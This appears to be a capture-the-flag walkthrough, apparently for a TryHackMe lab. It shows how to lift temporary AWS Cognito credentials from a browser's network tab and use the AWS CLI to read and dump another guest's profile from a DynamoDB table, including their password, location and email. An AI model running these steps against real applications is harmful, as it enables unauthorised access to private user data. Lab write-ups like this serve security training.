1. Reconnaissance (Browser DevTools)
Open the target URL and press F12 to open Developer Tools.
Go to the Network tab and refresh the page. 
Find Cognito Request: Filter for cognito-identity. Look for a POST to cognito-identity.us-east-1.amazonaws.com with the header X-Amz-Target: AWSCognitoIdentityService.GetCredentialsForIdentity. 
Extract Credentials: Click the request → Response tab. Copy the JSON values:
AccessKeyId (starts with ASIA...)
SecretKey
SessionToken
IdentityId
Find Target Table: Filter for dynamodb. Inspect the request payload to find the TableName (e.g., complimentary-GuestWellnessProfiles) and the guest_id format (e.g., guest-xxxxxx). 
2. Configuration (AWS CLI)
Set the extracted credentials as environment variables in your terminal:

export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."
export AWS_DEFAULT_REGION="us-east-1"

3. Execution & Data Dump
Verify Access: Confirm you can read your own profile.
aws dynamodb get-item --table-name complimentary-GuestWellnessProfiles --key '{"guest_id":{"S":"guest-YOUR_ID"}}'

Access Other Users: Prove the authorization flaw by reading a different user (e.g., "Lambo").
aws dynamodb get-item --table-name complimentary-GuestWellnessProfiles --key '{"guest_id":{"S":"guest-lambo"}}'

Result: You will see Lambo's password, GPS coordinates, and email.
Retrieve the Flag: Scan the entire table to find the hidden flag.
aws dynamodb scan --table-name complimentary-GuestWellnessProfiles | grep -i "THM{"

Flag Format: Typically found in a notes field, e.g., THM{fr33_app_fr33_d4t4!}. 
